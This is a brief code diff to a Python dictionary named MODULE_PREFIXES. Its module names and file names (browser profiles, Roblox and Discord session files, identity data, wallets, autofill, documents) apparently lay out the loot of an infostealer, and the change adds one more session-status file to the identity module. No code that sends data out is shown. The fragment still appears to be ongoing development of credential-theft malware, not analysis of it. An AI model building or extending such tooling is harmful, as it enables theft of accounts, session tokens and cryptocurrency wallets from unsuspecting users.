@@ -58,7 +58,7 @@ MODULE_PREFIXES: Final[dict[str, tuple[str, ...]]] = {
     "browsers": ("",),  # one tree per browser/profile, all of it owned
     "roblox": ("roblox_session.txt", "roblox_status.json"),
     "sessions": ("discord_session.txt", "sessions.json"),
-    "identity": ("identity.json",),
+    "identity": ("identity.json", "session_status.json"),
     "wallets": ("",),
     "autofill": ("",),
     "documents": ("documents.json",),
